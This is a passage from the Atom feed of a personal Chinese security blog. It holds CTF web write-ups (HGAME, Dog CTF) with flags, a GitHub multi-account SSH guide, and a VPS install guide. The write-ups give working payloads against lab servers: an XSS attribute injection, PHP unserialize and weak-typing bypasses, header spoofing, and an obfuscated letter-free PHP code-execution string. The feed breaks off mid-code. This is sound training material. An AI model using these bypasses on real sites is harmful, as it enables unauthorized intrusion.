<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s Blog</title>
  
  <subtitle>Kage&#39;s Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-02-07T04:20:38.012Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hgame-web-week1</title>
    <link href="http://yoursite.com/2019/02/03/hgame%E8%8D%89%E7%A8%BF/"/>
    <id>http://yoursite.com/2019/02/03/hgame草稿/</id>
    <published>2019-02-03T10:28:51.686Z</published>
    <updated>2019-02-07T04:20:38.012Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-谁吃了我的flag"><a href="#1-谁吃了我的flag" class="headerlink" title="1. 谁吃了我的flag"></a>1. 谁吃了我的flag</h3><p><img src="/img/1548569716058.png" alt=""><br>获取vim备份文件<br>vim自动退出会临时备份隐藏文件 .xxx.swp<br>用linux打<br><code>vim -r .xxx.swp</code> 可以恢复备份文件<br>hgame{3eek_diScl0Sure_fRom+wEbsit@}</p><h3 id="2-换头大作战"><a href="#2-换头大作战" class="headerlink" title="2. 换头大作战"></a>2. 换头大作战</h3><p><img src="/img/1548570653300.png" alt=""><br>输入框输入，要求使用post<br>post输入<br>要求使用waterfox，更改<br>要求bilibili登录<br>最后得到flag<br>hgame{hTTp_HeaDeR_iS_Ez}</p><h3 id="3-very-easy-web"><a href="#3-very-easy-web" class="headerlink" title="3. very easy web"></a>3. very easy web</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹/img/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">if($_GET[&apos;id&apos;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>urldecode()函数的危险问题<br>php会进行自动解码一次<br>如果使用这个函数，可以通过二次编码绕过前面的过滤<br>hgame{urlDecode_Is_GoOd}</p><h3 id="4-can-you-find-me"><a href="#4-can-you-find-me" class="headerlink" title="4. can you find me"></a>4. can you find me</h3><p><img src="/img/1548571660564.png" alt=""><br><img src="/img/1548571688433.png" alt=""><br>从返回包头找到密码woyaoflag<br>发送post密码得到flag<br>hgame{f12_1s_aMazIng111}</p><h3 id="5-Hidden-Image-in-LSB"><a href="#5-Hidden-Image-in-LSB" class="headerlink" title="5. Hidden Image in LSB"></a>5. Hidden Image in LSB</h3><p>有StegSolve打开，按下面左右调试即可<br><img src="/img/1548572207626.png" alt=""><br>hgame{LSB_is_easy_for_u}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-谁吃了我的flag&quot;&gt;&lt;a href=&quot;#1-谁吃了我的flag&quot; class=&quot;headerlink&quot; title=&quot;1. 谁吃了我的flag&quot;&gt;&lt;/a&gt;1. 谁吃了我的flag&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/1548569716058.png
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>同一台电脑连接多个github仓库</title>
    <link href="http://yoursite.com/2019/02/03/%E5%90%8C%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E5%A4%9A%E4%B8%AAgithub%E4%BB%93%E5%BA%93/"/>
    <id>http://yoursite.com/2019/02/03/同一台电脑连接多个github仓库/</id>
    <published>2019-02-03T08:30:05.140Z</published>
    <updated>2019-02-03T10:38:40.382Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-生成密钥"><a href="#0x01-生成密钥" class="headerlink" title="0x01.生成密钥"></a>0x01.生成密钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yourname@email.com&quot;</span><br></pre></td></tr></table></figure><p>分别生成两次公钥，可以得到两组公钥和私钥</p><h3 id="0x02-在github上添加公钥"><a href="#0x02-在github上添加公钥" class="headerlink" title="0x02. 在github上添加公钥"></a>0x02. 在github上添加公钥</h3><p>不解释</p><h3 id="0x03-添加config配置文件"><a href="#0x03-添加config配置文件" class="headerlink" title="0x03. 添加config配置文件"></a>0x03. 添加config配置文件</h3><p>在.ssh文件夹下添加config文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#第一个账号 Bu1uokage</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">#第二个账号 K4ge</span><br><span class="line">Host K4ge</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_K4ge</span><br></pre></td></tr></table></figure></p><p>说明：</p><ol><li>Host 可以是自定义的随机别名，如<code>K4ge</code>，在后面clone时会用到</li><li>Hostname 就默认配置就好</li><li>User默认就使用git就好</li><li>IdentityFile即公钥对应目录</li></ol><h3 id="0x04-SSH连接"><a href="#0x04-SSH连接" class="headerlink" title="0x04. SSH连接"></a>0x04. SSH连接</h3><p>如果出现Could not open a connection to your authentication agent错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br></pre></td></tr></table></figure></p><p>可以使用上述命令解决</p><p>添加ssh到agent中，<code>ssh-add -D</code>将agent中的删除，然后再依次添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa</span><br><span class="line">ssh-add id_rsa_K4ge</span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure></p><p>测试连接远程github服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T K4ge</span><br></pre></td></tr></table></figure></p><h3 id="0x05-git实战"><a href="#0x05-git实战" class="headerlink" title="0x05. git实战"></a>0x05. git实战</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:K4ge/gitskills.git</span><br><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@K4ge:K4ge/gitksills.git</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;new README&quot;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>先删除当前为github.com的remote<br>然后添加新的remote为K4ge，然后就可以push到新账号了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-生成密钥&quot;&gt;&lt;a href=&quot;#0x01-生成密钥&quot; class=&quot;headerlink&quot; title=&quot;0x01.生成密钥&quot;&gt;&lt;/a&gt;0x01.生成密钥&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VPS软件安装指南</title>
    <link href="http://yoursite.com/2018/10/06/vps%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/10/06/vps安装指南/</id>
    <published>2018-10-06T03:58:51.017Z</published>
    <updated>2018-10-06T04:03:52.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近重新捣鼓了一下vps，决定整理一下vps的一些安装资料。</p><h2 id="小飞机"><a href="#小飞机" class="headerlink" title="小飞机"></a>小飞机</h2><h3 id="a-安装"><a href="#a-安装" class="headerlink" title="a.安装"></a>a.安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocksR.sh https://git.io/vHRHi</span><br><span class="line">chmod +x shadowsocksR.sh</span><br><span class="line">./shadowsocksR.sh 2&gt;&amp;1 | tee shadowsocksR.log</span><br></pre></td></tr></table></figure><p>然后设置密码端口，其他默认就行。<br><a id="more"></a></p><h3 id="b-更换内核"><a href="#b-更换内核" class="headerlink" title="b.更换内核"></a>b.更换内核</h3><p>CentOS6 内核更换为：2.6.32-504.3.3.el6.x86_64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rpm -ivh http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-firmware-2.6.32-504.3.3.el6.noarch.rpm</span><br><span class="line">rpm -ivh http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-2.6.32-504.3.3.el6.x86_64.rpm --force</span><br></pre></td></tr></table></figure><p>CentOS7 内核更换为：3.10.0-229.1.2.el7.x86_64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-3.10.0-229.1.2.el7.x86_64.rpm --force</span><br></pre></td></tr></table></figure><p>查看内核是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep kernel</span><br></pre></td></tr></table></figure><p>重启，查看内核是否更换成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>如何查找想要的内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:centos.org 你需要的内核</span><br></pre></td></tr></table></figure><h3 id="c-锐速"><a href="#c-锐速" class="headerlink" title="c.锐速"></a>c.锐速</h3><p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh &amp;&amp; bash serverspeeder-all.sh</span><br></pre></td></tr></table></figure></p><p>常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/serverspeeder/bin/serverSpeeder.sh start/stop/restart</span><br><span class="line">service serverSpeeder status</span><br></pre></td></tr></table></figure><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="a-内核升级"><a href="#a-内核升级" class="headerlink" title="a.内核升级"></a>a.内核升级</h3><p>a. Centos 6内核升级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uname -r   #内核查看确认</span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm #安装yum源</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-lt -y #安装内核</span><br><span class="line">vim /etc/grub.conf #将default改为0</span><br><span class="line">reboot</span><br><span class="line">uname -r #查看内核是否升级成功</span><br></pre></td></tr></table></figure><p>b. Centos 7内核升级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">uname -sr #查看当前版本</span><br><span class="line">yum clean all</span><br><span class="line">yum update</span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm</span><br><span class="line">yum --disablerepo=&quot;*&quot; --enablerepo=&quot;elrepo-kernel&quot; list available #仓库启用</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-ml #安装内核</span><br><span class="line">cat /boot/grub2/grub.cfg | grep menuentry #查看有没有相应内核</span><br><span class="line">grub2-set-default 0 #修改默认启动项</span><br><span class="line">grub2-editenv list #看设置了没有</span><br><span class="line"></span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg #生成更新grub.cfg</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="b-安装docker"><a href="#b-安装docker" class="headerlink" title="b.安装docker"></a>b.安装docker</h3><p>centos 6 安装docker1.9.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL -O https://get.docker.com/builds/Linux/x86_64/docker-1.9.1 &amp;&amp; chmod +x docker-1.9.1 &amp;&amp; mv docker-1.9.1 /usr/local/bin/docker</span><br><span class="line">cp /usr/local/bin/docker /usr/bin/docker</span><br><span class="line">service docker start</span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><h2 id="lnmp"><a href="#lnmp" class="headerlink" title="lnmp"></a>lnmp</h2><h3 id="a-安装-1"><a href="#a-安装-1" class="headerlink" title="a.安装"></a>a.安装</h3><p>一键安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.5.tar.gz -cO lnmp1.5.tar.gz &amp;&amp; tar zxf lnmp1.5.tar.gz &amp;&amp; cd lnmp1.5 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure></p><p>选项根据需求就行</p><p>LNMP相关目录及文件位置<br><a href="https://lnmp.org/faq/lnmp-software-list.html" target="_blank" rel="noopener">https://lnmp.org/faq/lnmp-software-list.html</a></p><h3 id="b-域名设置"><a href="#b-域名设置" class="headerlink" title="b.域名设置"></a>b.域名设置</h3><p><a href="https://blog.csdn.net/grn11/article/details/77869117" target="_blank" rel="noopener">https://blog.csdn.net/grn11/article/details/77869117</a></p><p>lnmp vhost add<br>根据选项设置，基本上大部分默认就行</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/17522251883e" target="_blank" rel="noopener">ShadowsocksR+锐速配置及优化</a><br><a href="https://www.cnblogs.com/zksfyz/p/7919425.html" target="_blank" rel="noopener">CentOS内核升级</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近重新捣鼓了一下vps，决定整理一下vps的一些安装资料。&lt;/p&gt;
&lt;h2 id=&quot;小飞机&quot;&gt;&lt;a href=&quot;#小飞机&quot; class=&quot;headerlink&quot; title=&quot;小飞机&quot;&gt;&lt;/a&gt;小飞机&lt;/h2&gt;&lt;h3 id=&quot;a-安装&quot;&gt;&lt;a href=&quot;#a-安装&quot; class=&quot;headerlink&quot; title=&quot;a.安装&quot;&gt;&lt;/a&gt;a.安装&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget --no-check-certificate -O shadowsocksR.sh https://git.io/vHRHi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chmod +x shadowsocksR.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./shadowsocksR.sh 2&amp;gt;&amp;amp;1 | tee shadowsocksR.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后设置密码端口，其他默认就行。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>道格ctf web wp</title>
    <link href="http://yoursite.com/2018/10/06/%E9%81%93%E6%A0%BCctf%20web%20wp/"/>
    <id>http://yoursite.com/2018/10/06/道格ctf web wp/</id>
    <published>2018-10-05T16:06:46.570Z</published>
    <updated>2018-10-06T14:36:06.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说好的要好好写博客呢，怎么这么久还没发布新文章。别急啦，文章并不是主要的，关键在于有没有在搞技术啦。最近国庆没什么事干，就到各个平台刷一下CTF，这里就总结一下道格平台web的wp。</p><h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p>前两题主要学习HTTP的两种传参方式，GET传参和POST传参，这也是web安全漏洞产生的两个主要入口。<br>如何GET传参呢？在网页的网址就是url末尾加上？然后以键值对形式表示，多个值要用&amp;分隔。<br>Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.12.21.77:8080/get/get.php?what=flag</span><br></pre></td></tr></table></figure></p><a id="more"></a><h2 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h2><p>POST传参可以用火狐一个很好用的插件Hackerbar来进行，当然还可以用burpsuit进行抓包修改。这两个工具都是web安全最常用也是必须掌握的哦。<br><img src="/img/10501.jpg" alt=""></p><h2 id="突破物理极限"><a href="#突破物理极限" class="headerlink" title="突破物理极限"></a>突破物理极限</h2><p>好难受，被限制只能输入3个字符，怎么办？</p><p>其实对于别人发过来的前端页面，我们都是可以进行修改的。可以在各个浏览器按F12调出控制台修改，我是用的火狐的Firebug进行修改。</p><p>当然以后在验证码绕过啊，js限制什么的也可以用同样的方法。<br><img src="/img/10502.jpg" alt=""></p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$KEY = &quot;D0g3!!!&quot;;</span><br><span class="line">$str = $_GET[&apos;str&apos;];</span><br><span class="line">if (unserialize($str) === &quot;$KEY&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p>审一下代码，这题关键在于如何<code>if (unserialize($str) === &quot;$KEY&quot;)</code>这个条件为真，这就涉及到一些反序列化的知识，简单总结一下。</p><p>为了方便不同的php文件在各个对象、数组、字符串的传输，php引入了序列化。序列化通俗点讲就是把对象、数组和字符串转换成一串带有特定格式的json字符串进行数据传输，而反序列化当然就是把json字符串转换成数组对象等。当然这方面知识可以学习下网上的一些文章，毕竟是wp不过多解释了。</p><p>这里构造json字符串进行反序列化绕过判断。如果不想构造的话，也可以自己写个php文件，序列化自己想要的东西，输出出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = &quot;D0g3!!!&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22;</span><br></pre></td></tr></table></figure><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>这题刚开始打开题目的时候，有点懵逼，没有提交按钮怎么上传数据，后来发现是用GET传参，真是不按套路…</p><p>查看源码，很容易发现，注入点在<code>value=&#39;111&#39;</code>处。试了下尖括号和”发现都被过滤，应该是对输入点进行了<code>htmlspecialchars()</code>函数的过滤。</p><p>但是这个函数并不对单引号过滤并且注入点在标签内，尝试构造语句。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.33.253:9004/?id=&apos; onclick=alert(&apos;xss&apos;) a=&apos;</span><br></pre></td></tr></table></figure><h2 id="机器人"><a href="#机器人" class="headerlink" title="机器人"></a>机器人</h2><p>从题目提示和robots.html，很明显知道应该要检查一下robots.txt。</p><p>robots.txt是用来告诉爬虫机器人，什么文件是不希望被看到，并且不允许爬取的（强行爬也不是不可以…）</p><p>查看robots.txt，看到Disallow: /robots/flag.txt</p><p>查看flag.txt得到flag</p><h2 id="爆破拿flag"><a href="#爆破拿flag" class="headerlink" title="爆破拿flag"></a>爆破拿flag</h2><p>看题目当然就知道要用爆破的方法，提示五位数密码，爆破一般可以自己写python脚本，也可以用burpsuit工具来实现。<br><img src="/img/10505.jpg" alt=""></p><h2 id="数字比较"><a href="#数字比较" class="headerlink" title="数字比较"></a>数字比较</h2><p>这道题直接给了我们源码，应该是要让我们自己搭环境测试的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &quot;xxxxx&quot;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord ¡ª ·µ»Ø×Ö·ûµÄ ASCII ÂëÖµ</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord ¡ª ·µ»Ø×Ö·ûµÄ ASCII ÂëÖµ</span><br><span class="line">$number = &apos;3735929050&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">echo &apos;第&apos;.($i+1).&apos;次： &apos;;</span><br><span class="line">echo &apos;temp=&apos;.$temp.&apos; &apos;;</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">echo &apos;digit=&apos;.ord($temp&#123;$i&#125;);</span><br><span class="line">echo &apos;one=&apos;.$one.&apos; &apos;;</span><br><span class="line">echo &apos;nine=&apos;.$nine.&apos; &apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目大致意思是，对于我们输入的一串数字，会分解成单个数字，并将他的ascii值与1和9的ascii值比较，如果在1~9内就返回false，通过判断最后和代码内置的数字串进行比较，一样就返回flag。</p><p>很明显是考php弱类型，用之前总结的数字字母比较，二进制比较什么的都失败了，后来尝试传’空格+3735929050’尽然成功绕过判断，这题涨知识了。</p><p>空格+数字==数字</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://206.189.214.99:1080/2.php?password=                 3735929050</span><br></pre></td></tr></table></figure><h2 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h2><p>打开题目，有点可恶，什么都不给点。<br>果断打开firebug，把那些作恶的javascript删掉，删的同时看到了出题人的flag代码嘿嘿嘿，偷偷改造一下。<br><img src="/img/10503.jpg" alt=""><br>点击搜索，成功弹出<br><img src="/img/10504.jpg" alt=""></p><p>其实我不是用这个方法做的，之前题目挂了没法做，就先做后面的WEB||Linux，拿到那题的shell以后，尽然能在里面www目录下找到这题的源码。。。问了下出题人，主要是docker数量有限，没办法..算是非预期解吧..</p><h2 id="你能让他停下来吗"><a href="#你能让他停下来吗" class="headerlink" title="你能让他停下来吗"></a>你能让他停下来吗</h2><p>这题当时做的时候很简单，只要用burpsuit抓下包看下返回包的头信息就可以了。</p><p>但是整理wp的时候，题目好像又改造了下加大了点难度。<br>我们直接访问index.html，仔细观察可以发现已经跳转到了location.html，根据提示应该是用了js的windowlocation跳转。那我们应该怎么抓住index.html呢？</p><p>可以先用burpsuit抓到location.php，然后传到Repeater模块进行重放，把location.php改为index.php就能抓到包了。<br><img src="/img/10506.jpg" alt=""></p><h2 id="欢迎加入道格小组"><a href="#欢迎加入道格小组" class="headerlink" title="欢迎加入道格小组"></a>欢迎加入道格小组</h2><p>提示要内部访问，并且从referer.php就知道要添加http头。</p><p>referer：告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><p>添加referer头成功绕过检测。<br><img src="/img/10507.jpg" alt=""></p><h2 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h2><p>与上一题类似，将user-agent修改就行了。<br><img src="/img/10508.jpg" alt=""></p><h2 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h2><p>同样考点，添加X-forwarded-for:127.0.0.1</p><p>127.0.0.1指的是本地ip地址。<br><img src="/img/10509.jpg" alt=""></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这题信安之路的一个老哥的文章写的很棒，可以去学习一下。第一次接触到这种东西的时候，真的觉得太骚了，膜拜一下师傅们。<a href="https://www.liuxianglai.top/?p=145" target="_blank" rel="noopener">PHP不使用数字,字母和下划线写shell</a></p><p>当然这题要直接自己构造payload还是要花点时间的，可以用下老哥上面的通解。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.33.253:9000/index.php?code=$&#123;%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22&#125;[%27%2b%27]();&amp;%2b=flag</span><br></pre></td></tr></table></figure><h2 id="Match-it"><a href="#Match-it" class="headerlink" title="Match it"></a>Match it</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span 